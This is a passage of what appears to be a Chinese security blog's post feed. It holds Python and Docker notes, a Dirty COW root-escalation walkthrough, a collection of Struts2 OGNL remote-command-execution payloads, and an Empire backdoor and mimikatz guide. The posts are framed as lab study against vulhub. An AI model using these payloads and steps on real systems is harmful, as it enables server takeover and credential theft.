#将可迭代的对象作为参数，将对象中对应的元素打包成一个个元组，然后返回由这些元组组成的对象</li><li>__import__() #用于动态加载类和函数<pre><code>import sys__import__(&#39;base64&#39;) #导入base64.py模块</code></pre></li></ol><p><strong>数据结构</strong></p><ol><li><img src="/Python%E5%9F%BA%E7%A1%80/34.png" alt></li></ol><h2 id="0x20-模块"><a href="#0x20-模块" class="headerlink" title="0x20 模块"></a>0x20 模块</h2><p><strong>查看已安装模块</strong></p><ol><li>pip list #列出已安装模块</li><li>pip freeze #列出已安装模块</li></ol><p><strong>查看模块帮助信息</strong></p><ol><li>&gt;&gt;&gt; help(“modulename”) #查看模块帮助信息</li><li>pydoc modulename #查看模块帮助信息</li></ol><h3 id="0x21-导入模块或函数"><a href="#0x21-导入模块或函数" class="headerlink" title="0x21 导入模块或函数"></a>0x21 导入模块或函数</h3><ol><li>import module</li><li>from module import function</li><li>from module import function1,function2</li><li>from module import *</li><li></li><li>import sys</li><li>print(sys.path) </li><li></li><li>from sys import path</li><li>print(path)</li><li></li><li>#文件名：test.py</li><li>import sys</li><li>for i in sys.argv:</li><li>print(i)</li><li>#执行结果：</li><li>python test.py 参数1 参数2</li><li>test.py</li><li>参数1</li><li>参数2  </li><li><a href="https://www.runoob.com/python3/python3-module.html" target="_blank" rel="noopener">python3模块</a></li></ol><h2 id="0x23-常用模块"><a href="#0x23-常用模块" class="headerlink" title="0x23 常用模块"></a>0x23 常用模块</h2><ol><li><p>import os</p></li><li><p>os.getcwd() #获取当前目录</p></li><li><p>os.path #用于对系统路径文件的操作</p></li><li><p>import sys</p></li><li><p>sys.path #动态地改变Python解析器搜索路径</p></li></ol><h2 id="0x30-动态链接库"><a href="#0x30-动态链接库" class="headerlink" title="0x30 动态链接库"></a>0x30 动态链接库</h2><ol><li>dynamically linked library（被动态连接的库），一个二进制文件，不主动运行，由其他程序调用执行。</li><li>windows：dynamic link libraries（DLL）动态链接库</li><li>Linux：shared objects（SO）共享库</li><li>ctypes提供三种方法调用动态链接库：cdll()、windll()、oledll()</li></ol><h2 id="0x31-调用C库"><a href="#0x31-调用C库" class="headerlink" title="0x31 调用C库"></a>0x31 调用C库</h2><ol><li>C:\Windows\System32\msvcrt.dll</li><li><img src="/Python%E5%9F%BA%E7%A1%80/35.png" alt></li><li><img src="/Python%E5%9F%BA%E7%A1%80/36.png" alt></li></ol><h2 id="0x-python与文件"><a href="#0x-python与文件" class="headerlink" title="0x python与文件"></a>0x python与文件</h2><ol><li>输出到文件<pre><code>#coding:utf-8file=open(&quot;F:\\1.txt&quot;,&quot;w+&quot;)for i in range(0,256): file.write(&quot;%&quot;+str(i)+&quot;\n&quot;)file.close()</code></pre></li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://www.runoob.com/python3/python3-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/python3/python3-tutorial.html</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 知识 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权之Linux-dirtycow</title>
      <link href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-dirtycow/"/>
      <url>/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-dirtycow/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-dirtycow（脏牛）提权"><a href="#0x00-dirtycow（脏牛）提权" class="headerlink" title="0x00 dirtycow（脏牛）提权"></a>0x00 dirtycow（脏牛）提权</h2><ol><li>2007年发行至2016年10月18日修复</li><li>Linux kernel&gt;2.6.22</li><li>uname -r #查看内核版本</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-dirtycow/1.png" alt></li><li><a href="https://github.com/FireFart/dirtycow" target="_blank" rel="noopener">EXP1</a></li><li>下载dirty.c到/tmp</li><li>useradd test #添加普通用户</li><li>useradd -s /bin/bash test #修改test的登录shell，默认是/bin/sh</li><li>su test #切换到用户test</li><li>gcc -pthread -lcrypt dirty.c -o dirty #编译dirty.c，生成执行文件dirty</li><li>id #查看用户权限</li><li>./dirty password #执行提权程序，密码设为password</li><li>要等~</li><li>su firefart #切换到程序预设的用户名，密码就是刚设的password</li><li>id #已经是root权限</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-dirtycow/2.png" alt></li></ol><h2 id="0x01-备忘"><a href="#0x01-备忘" class="headerlink" title="0x01 备忘"></a>0x01 备忘</h2><ol><li>记得恢复/etc/passwd</li><li>mv /tmp/passwd.bak /etc/passwd</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-dirtycow/3.png" alt></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker使用</title>
      <link href="/docker%E4%BD%BF%E7%94%A8/"/>
      <url>/docker%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-docker准备"><a href="#0x00-docker准备" class="headerlink" title="0x00 docker准备"></a>0x00 docker准备</h2><ol><li>安装docker</li><li>apt-get install docker docker-compose</li><li>启动、重启、查看状态、停止</li><li>service docker start</li><li>service docker restart</li><li>service docker status</li><li>service docker stop</li><li><img src="/docker%E4%BD%BF%E7%94%A8/1.png" alt></li></ol><h2 id="0x10-docker命令帮助"><a href="#0x10-docker命令帮助" class="headerlink" title="0x10 docker命令帮助"></a>0x10 docker命令帮助</h2><ol><li>docker –help</li><li>docker command –help</li></ol><h2 id="0x20-docker镜像"><a href="#0x20-docker镜像" class="headerlink" title="0x20 docker镜像"></a>0x20 docker镜像</h2><ol><li>docker pull ubuntu #拉取/载入镜像</li><li>docker images #列出本地主机上的所有镜像</li><li>docker run -d REPOSITORY #启动容器</li><li>REPOSITORY：镜像的仓库源，TAG：镜像的标签，IMAGE ID：镜像ID，CREATED：镜像创建时间，SIZE：镜像大小</li><li>docker run -t -i ubuntu:14.04 /bin/bash #使用ubuntu14.04版本镜像运行容器，-t：终端，-i：交互式操作，/bin/bash：使用的shell</li><li>docker search ubuntu:14.04 #查看镜像</li><li>NAME：镜像仓库源的名称，DESCRIPTION: 镜像的描述，stars: 类似 Github 里面的 star，OFFICIAL: 是否 docker 官方发布，AUTOMATED: 自动构建</li><li>docker rmi [REPOSITORY] #删除镜像</li><li>docker tag ID XXX #设置镜像标签</li><li>docker rmi $(docker images | awk ‘{print $3}’ | tail -n +2) #批量删除镜像</li></ol><h3 id="0x21-构建镜像"><a href="#0x21-构建镜像" class="headerlink" title="0x21 构建镜像"></a>0x21 构建镜像</h3><ol><li>先创建一个dockerfile文件</li><li>docker build -t IMAGE . #.：dockerfile文件所在目录</li></ol><h2 id="0x30-docker容器"><a href="#0x30-docker容器" class="headerlink" title="0x30 docker容器"></a>0x30 docker容器</h2><ol><li>docker run -itd ubuntu /bin/bash #启动容器，-i：交互式操作，-t：终端，-d：容器启动后进入后台，Ubuntu：Ubuntu镜像，/bin/bash：使用的shell是/bin/bash，（如果没有Ubuntu这个镜像就新拉取，exit：退出）</li><li>docker ps -a #查看所有的容器</li><li>docker ps #查看正在运行的容器</li><li>容器ID：使用的镜像：启动容器时运行的命令：容器创建的时间：容器状态：容器端口和连接类型（tcp/udp）：容器名称</li><li>docker start ID #启动容器</li><li>docker restart ID #重启容器</li><li>docker stop ID #停止容器</li><li>docker stop ID #停止容器</li><li>docker logs ID #查看指定容器的日志</li><li>docker stats #查看所有容器的状态</li><li>docker exec -it ID /bin/bash #进入后台运行的容器</li><li>docker export ID &gt; ubuntu.tar #导出容器</li><li>cat ubuntu.tar | docker import - IMGAE #本地导入容器</li><li>docker import <a href="http://domain/xx.tgz" target="_blank" rel="noopener">http://domain/xx.tgz</a> IMAGE</li><li>docker rm ID/NAME #删除web应用容器，但必须先停止容器</li><li>docker rm -f ID/NAME #-f：强制删除容器</li><li>docker container prune #清除已停止状态的容器</li><li></li><li>docker start $(docker ps -a | awk ‘{print $1}’ | tail -n +2) #批量启动容器</li><li>docker stop $(docker ps -a | awk ‘{print $1}’ | tail -n +2) #批量关闭容器</li><li></li><li>docker rm $(docker ps -a | awk ‘{print $1}’ | tail -n +2) #批量删除容器</li></ol><h2 id="0x40-运行web应用"><a href="#0x40-运行web应用" class="headerlink" title="0x40 运行web应用"></a>0x40 运行web应用</h2><ol><li>docker pull training/webapp #载入镜像</li><li>docker run -d -P training/webapp python app.py #运行python flask应用来运行一个web应用</li><li>-d：后台运行，-P：容器内部使用的网络端口映射到使用的主机上</li><li><img src="/docker%E4%BD%BF%E7%94%A8/2.png" alt></li><li>docker的5000端口（Python flask默认端口）映射到主机的32768端口上</li><li><img src="/docker%E4%BD%BF%E7%94%A8/3.png" alt></li><li>docker run -d -p 127.0.0.1:5001:5000 –name hello_world training/webapp python app.py #-p：docker的5000端口映射到本地主机端口5001，–name：自主命名</li><li>docker port ID #查看容器的端口映射</li><li>docker port NAME #查看容器的端口映射</li><li>docker logs -f ID #查看web应用程序日志</li><li>docker top NAME #查看web应用程序容器的进程</li><li>docker inspect NAME #查看web应用程序的底层信息</li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><p><a href="https://www.runoob.com/docker/docker-tutorial.html" target="_blank" rel="noopener">https://www.runoob.com/docker/docker-tutorial.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Struts2漏洞系列</title>
      <link href="/Struts2%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97/"/>
      <url>/Struts2%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><h2 id="0x10-S2-001信息"><a href="#0x10-S2-001信息" class="headerlink" title="0x10 S2-001信息"></a>0x10 S2-001信息</h2><ol><li>官方链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a></li><li>影响版本：WebWork 2.1（启用altSyntax），WebWork 2.2.0-WebWork 2.2.5，Struts 2.0.0-Struts 2.0.8</li><li>不受影响：WebWork 2.0，WebWork 2.1（禁用altSyntax，这是默认设置）</li><li></li><li><strong>漏洞原理：</strong></li><li>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行。</li><li>环境：</li><li><a href="https://vulhub.org/#/environments/struts2/s2-001/" target="_blank" rel="noopener">https://vulhub.org/#/environments/struts2/s2-001/</a></li><li>安装docker</li><li>sudo apt install docker.io</li><li>下载<a href="https://github.com/vulhub/vulhub/archive/master.zip" target="_blank" rel="noopener">vulhub</a></li><li>进入vulhub对应的漏洞目录，建立测试环境</li><li>docker-compose up -d 或者 docker-compose build</li><li>浏览器访问</li><li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97/2.png" alt></li><li>列出镜像</li><li>docker images</li><li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97/1.png" alt></li><li>关闭环境</li><li>docker-compose down</li></ol><h2 id="0x11-漏洞利用与payload（需要url编码）"><a href="#0x11-漏洞利用与payload（需要url编码）" class="headerlink" title="0x11 漏洞利用与payload（需要url编码）"></a>0x11 漏洞利用与payload（需要url编码）</h2><ol><li>获取tomcat执行路径：<pre><code>%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;}</code></pre></li><li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97/3.png" alt></li><li></li><li>获取Web路径<pre><code>%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#39;/&#39;)),#response.flush(),#response.close()}</code></pre></li><li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97/4.png" alt></li><li></li><li>执行任意命令（命令加参数：new java.lang.String[]{“cat”,”/etc/passwd”}）<pre><code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;pwd&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</code></pre></li><li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97/5.png" alt></li><li><img src="/Struts2%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97/6.png" alt></li></ol><h2 id="0x12-官方修复"><a href="#0x12-官方修复" class="headerlink" title="0x12 官方修复"></a>0x12 官方修复</h2><p><img src="/Struts2%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97/7.png" alt></p><ol><li>XWork 2.0.4中，改变了ognl表达式的解析方法从而不会产生递归解析，用户的输入也不会再解析执行。</li><li>因为解析一层表达式后，loopCount &gt; maxLoopCount，直接执行break，不再解析用户的恶意代码。</li><li><a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-001/README.zh-cn.md" target="_blank" rel="noopener">参考</a></li></ol><h2 id="0x20-S2-005信息"><a href="#0x20-S2-005信息" class="headerlink" title="0x20 S2-005信息"></a>0x20 S2-005信息</h2><ol><li>官方链接：<a href="https://cwiki.apache.org/confluence/display/WW/S2-005" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-005</a></li><li>影响版本：Struts 2.0.0 - Struts 2.1.8.1</li><li>漏洞原因：OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞。</li><li>S2-003使用\u0023绕过s2对#的防御</li><li>S2-003添加了沙盒</li><li>S2-005使用OGNL表达式关闭沙盒，继续执行代码。</li></ol><h2 id="0x21-漏洞验证与payload"><a href="#0x21-漏洞验证与payload" class="headerlink" title="0x21 漏洞验证与payload"></a>0x21 漏洞验证与payload</h2><ol><li></li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></li></ol><h2 id="Struts2系列漏洞——OGNL注入表达式"><a href="#Struts2系列漏洞——OGNL注入表达式" class="headerlink" title="Struts2系列漏洞——OGNL注入表达式"></a>Struts2系列漏洞——OGNL注入表达式</h2><ol><li>漏洞编号：S2-001、S2-003、S2-005、S2-007、S2-009、S2-012、S2-013、S2-015、S2-016、S2-019、S2-029、S2-032、S2-033、S2-037、S2-045、S2-046、S2-048、S2-052</li><li>request参数名、cookie名：(ognl)(constant)=value&amp;(constant)((ognl1)(ognl2))（S2-003、S2-005）</li><li>request参数值：%{ognl}、${ognl}、(ognl)、’ognl’（S2-007、S2-009、S2-012）</li><li>request的文件名：%{ognl}、${ognl}（S2-046）</li><li>request的URL：/%{ognl}.action、/${ognl}.action（S2-015）</li><li>request的content-type：%{ognl}、${ognl}（S2-045）</li></ol><h3 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h3><p>web_path</p><pre><code>%25%7B%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23response%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23response.println(%23req.getRealPath(&#39;%2F&#39;))%2C%23response.flush()%2C%23response.close()%7D</code></pre><p>S2-003</p><pre><code>(b)((&#39;%5C43context[%5C&#39;xwork.MethodAccessor.denyMethodExecution%5C&#39;]%5C75false&#39;)(b))&amp;(g)((&#39;%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest()&#39;)(d))&amp;(i2)((&#39;%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse()&#39;)(d))&amp;(i95)((&#39;%5C43xman.getWriter().println(%5C43req.getRealPath(%22\%22))&#39;)(d))&amp;(i99)((&#39;%5C43xman.getWriter().close()&#39;)(d))</code></pre><p>S2-005<br><strong>webpath</strong></p><pre><code>%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&amp;%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&amp;%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&amp;%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&amp;%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&amp;%28i97%29%28%28%27%5C43xman.getWriter%28%29.println%28%5C43req.getRealPath%28%22%5Cu005c%22%29%29%27%29%28d%29%29&amp;%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29</code></pre><p>S2-007</p><pre><code>&#39;%2b(%23_memberAccess.allowStaticMethodAccess=true,%23context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,%23cmd=&quot;ifconfig&quot;,%23ret=@java.lang.Runtime@getRuntime().exec(%23cmd),%23data=new+java.io.DataInputStream(%23ret.getInputStream()),%23res=new+byte[500],%23data.readFully(%23res),%23echo=new+java.lang.String(%23res),%23out=@org.apache.struts2.ServletActionContext@getResponse(),%23out.getWriter().println(%23echo))%2b&#39;</code></pre><p>S2-009</p><pre><code>foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27mkdir%20/tmp/PWNAGE%27%29%29%28meh%29&amp;z[%28foo%29%28%27meh%27%29]=true</code></pre><p>S2-012</p><pre><code>%{(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true)(#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false) #hackedbykxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#hackedbykxlzx.println(&#39;hacked by kxlzx&#39;),#hackedbykxlzx.close())}</code></pre><p>S2-013</p><pre><code>fakeParam=%25%7B(%23_memberAccess%5B&#39;allowStaticMethodAccess&#39;%5D%3Dtrue)(%23context%5B&#39;xwork.MethodAccessor.denyMethodExecution&#39;%5D%3Dfalse)(%23writer%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23writer.println(&#39;hacked&#39;)%2C%23writer.close())%7D</code></pre><p>S2-015</p><pre><code>${%23context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=!(%23_memberAccess[&#39;allowStaticMethodAccess&#39;]=true),(@java.lang.Runtime@getRuntime()).exec(&#39;calc&#39;).waitFor()}.action</code></pre><p>S2-016</p><pre><code>redirect:$%7B%23a%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),%23b%3d%23a.getRealPath(%22/%22),%23matt%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D</code></pre><p>S2-019</p><pre><code>debug=command&amp;expression=%23res%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23res.setCharacterEncoding(%22UTF-8%22),%23req%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletRequest&#39;),%23res.getWriter().print(%22S2-019        dir--***%22),%23res.getWriter().println(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23res.getWriter().flush(),%23res.getWriter().close()</code></pre><p>S2-029</p><pre><code>(%23_memberAccess[&#39;allowPrivateAccess&#39;]=true,%23_memberAccess[&#39;allowProtectedAccess&#39;]=true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]=%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]=%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]=true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;whoami&#39;).getInputStream()))</code></pre><p>S2-032/S2-033/S2-037</p><pre><code>%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&amp;pp=%2f&amp;encoding=UTF-8</code></pre><p>S2-045/S2-046</p><pre><code>%{(#nike=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println(88888888-23333+1222)).(#o.close())}</code></pre><p>S2-048</p><pre><code>%25%7b%28%23nike%3d%27multipart%2fform-data%27%29.%28%23dm%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3f%28%23_memberAccess%3d%23dm%29%3a%28%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23o%3d@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%29.%28%23req%3d@org.apache.struts2.ServletActionContext@getRequest%28%29%29.%28%23path%3d%23req.getRealPath%28%27%2f%27%29%29.%28%23o.println%28%23path%29%29.%28%23o.close%28%29%29%7d</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://www.freebuf.com/vuls/168609.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/168609.html</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> vulhub </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透之Empire</title>
      <link href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/"/>
      <url>/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Empire"><a href="#0x00-Empire" class="headerlink" title="0x00 Empire"></a>0x00 Empire</h2><ol><li>下载：git clone <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:EmpireProject/Empire.git 或者 git clone <a href="https://github.com/EmpireProject/Empire.git" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire.git</a></li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/1.png" alt></li><li>进入目录/Empire/setup/，运行./install.sh进行安装（或sudo ./install.sh）</li><li>安装完后，切换到/Empire，运行./empire</li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/2.png" alt></li><li>?或help #查看命令</li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/3.png" alt></li></ol><h2 id="0x01-监听与生成后门"><a href="#0x01-监听与生成后门" class="headerlink" title="0x01 监听与生成后门"></a>0x01 监听与生成后门</h2><ol><li>listeners #监听</li><li>返回No listeners currently active，就使用监听方式，输入uselistener[空格]按一下tab</li><li>这里选http</li><li>info #查看配置信息</li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/4.png" alt></li><li>设置shell文件名，连接ip与port</li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/5.png" alt></li><li>run或者execute #执行监听</li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/6.png" alt></li><li>返回上一层模块，要生成后门</li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/7.png" alt></li><li>其中multi为通用模块，osx为mac操作系统，windows为windows模块。</li><li>info #查看配置信息</li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/8.png" alt></li><li>生成后门文件（可以指定路径位置）。</li></ol><h2 id="0x02-管理员运行后门"><a href="#0x02-管理员运行后门" class="headerlink" title="0x02 管理员运行后门"></a>0x02 管理员运行后门</h2><ol><li>把后门文件拷贝/复制/上传/下载/…/到目的服务器上，并点击运行（会弹出cmd黑窗，一会就自动消失，因为生成后门时，查看配置信息有个Delete选项，默认设置为true，即运行后自动删除自己）</li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/9.png" alt></li><li>回到正在监听的主机，已经获取到目的服务器的一个代理</li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/10.png" alt></li><li>查看帮助命令</li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/11.png" alt> </li><li>agents #查看获取的代理（这里是管理员，因为是以管理员用户去运行了后门脚本），查看帮助信息，顺便改个名字</li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/12.png" alt></li><li><strong>获取代理后的一些命令</strong></li><li>agents #代理列表</li><li>back #返回</li><li>clear #清除代理任务</li><li>exit #代理退出</li><li>help #查看帮助信息</li><li>info #查看信息</li><li>interact [Name] #与[Name]进行交互</li><li>list #列出所有代理</li><li>kill #杀死相关进程</li><li>rename [Name] #重命名[Name]</li><li>main #返回主菜单</li><li>searchmodule #搜索模块</li><li>sleep #睡眠</li><li>usemodule #使用模块</li><li>usestager #生成后门方式</li><li></li><li>与目的服务器进行交互</li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/13.png" alt></li><li><strong>与目的服务器进行代理的一些命令</strong></li><li>help agentcmds #查看帮助命令</li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/14.png" alt></li><li>bypassuac #bypassuac模块，获取高级的代理</li><li>mimikatz #mimikatz模块，获取登录凭证</li><li>download #下载文件</li><li>upload #上传文件</li><li>sysinfo #查看服务器信息</li><li>shell dir #打开当前后门的目录位置</li><li>sc #截图，当前目的服务器</li><li></li><li>session_key是加密的，使用mimikatz来读取管理员的密码，直接报错退出了</li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/15.png" alt></li></ol><p><strong>使用NativePayload_DNS，通过DNS流量，绕过防病毒传输后门</strong><br><a href="https://www.secpulse.com/archives/73766.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/73766.html</a></p><h2 id="0x03-普通用户运行后门"><a href="#0x03-普通用户运行后门" class="headerlink" title="0x03 普通用户运行后门"></a>0x03 普通用户运行后门</h2><ol><li>获取代理</li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/16.png" alt></li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><p><a href="https://www.anquanke.com/" target="_blank" rel="noopener">https://www.anquanke.com/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/XSS/"/>
      <url>/XSS/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-XSS"><a href="#0x00-XSS" class="headerlink" title="0x00 XSS"></a>0x00 XSS</h2><p><img src="/XSS/1.jfif" alt></p><p><strong>漏洞描述</strong><br>&ensp;&ensp;&ensp;&ensp;XSS（Cross Site 